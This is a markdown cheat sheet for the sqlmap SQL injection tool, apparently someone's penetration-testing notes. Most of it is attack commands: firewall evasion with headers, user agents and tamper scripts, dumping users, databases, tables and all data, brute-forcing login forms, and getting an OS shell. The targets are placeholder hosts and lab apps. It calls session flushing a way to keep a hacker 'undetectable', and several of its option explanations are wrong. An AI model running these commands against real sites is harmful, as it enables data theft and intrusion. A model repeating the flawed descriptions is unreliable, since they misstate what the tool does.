# SQLmap

## Fuzzing Using SQLi

### Techniques

- B - boolean
- E - error based
- U - union
- S - stacked
- T - time based
- Q - inline queries

```bash
# specify parameter by 
$ sqlmap --technique="U"
```

### Crawl

Crawl is used to specify the depth of your scan

```bash
# Max Depth 4
D 1 : https://example.com/news
D 2 : https://example.com/news/latest
D 3 : https://example.com/news/latest/india
D 4 : https://example.com/news/latest/india/delhi
$ sqlmap --crawl 3
```

- batch this is used to avoid yes and no option in sqlmap and it will go for default

```bash
$ sqlmap --batch -u https://exaple.com
```

### Use Threads

```bash
$ sqlmap --threads 5
# default is 1 and max is 10
```

### Risk in sqlmap

```bash
# Default risk is 1 and it just checks for error based and union based injection
# So for agressive scan use risk to 3
$ sqlmap --risk 3 # perfect scan
```

### Level in sqlmap

if you fail to find sqli and exploit use level to also include user agent and cookie

```bash
$ sqlmap --level 5
```

### Verbosity

This can be further incremented to 6

```bash
$ sqlmap -v 6 # for detailed output
```

### Using headers to bypass checks

```bash
	$ sqlmap -u https://test.php.com/list.php?cat=1 -v 4 --headers="Referer:rahim.com"
```

### Using user agent to bypass firewall

```bash
$ sqlmap --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
```

### Use default mobile user agent to bypass security measures

```bash
$ sqlmap --mobile # will add in-built mobile security headers
```

## Bypass Firewall with encoded payloads

```bash
$ sqlmap --list-tampers
$ sqlmap --tamper="base64encode" / any other tamper method
```

## Exploit a url using SQLi

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1 --current-user --current-db --hostname --batch
# Get Mysql user's username
# Get Database name
# Get hostname
```

### Dump all dbs details

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1  --dbs --batch

```

### Dump all tables in specific database

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1  -D db_name --tables
```

### Dump a table contents

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1  -D db_name -T table_name --dump
```

### Get all columns in a specific table

```bash
	$ sqlmap -u https://test.php.com/list.php?cat=1  -D db_name -T table_name --columns
```

## Dump all data

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1  -D db_name --dump-all
```

### Store output

```bash
$ sqlmap -u https://test.php.com/list.php?cat=1  --output-dir="/home/rahim/output"
```

### Bruteforce login page for sql injection

```bash
# Things required 1 : login url  2 : action value  3 : name parameter
$ sqlmap -u https://test.php.com/login.php --forms
# then it will show different forms available in that page by detecting form tags

```

### Further exploit login function

```bash
# Suppose post request is going to /userinfo.php and it sends values as --data="login=iron&password=man&form=submit" 
$ sqlmap -u http://192.168.1.102:81/bWAPP/userinfo.php --data="login=iron&password=man&form=submit" --method POST --dbs --batch
```

## Login Test Using SQL map

```bash
$ sqlmap -u “http://192.168.56.101/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --proxy=http://127.0.0.1:8080 --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”
```

- ‘-u’: the url taken from ZAP to review the req/res
- ‘--proxy’: the OWASP ZAP proxy
- ‘--cookie’: the cookie taken from ZAP

```bash
$ sqlmap -u http://192.168.1.102:81/bWAPP/sqli_3.php --data="login=iron&password=man&form=submit" --method POST --dbs --batch
```

### Add cookie

```bash
$ sqlmap --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb;
$ sqlmap --flush-session
# Flush session in this sqlmap will request the webserver for new session ids so hacker will be undetectable
$ sqlmap --comment # Highlights the comments made in database by the dbms manager
$ sqlmap --os-shell # if root user is running sqlmap server it will give you Shell prompt
$ sqlmap --os-cmd #  # if root user is running sqlmap server it will give you Shell prompt

```

### Resume SQLmap

```bash
$ command --resume
CTRL+C 
# to resume again latter
$ command --resume
```

### Use with burp request

```bash
$ sqlmap -r request.txt
```
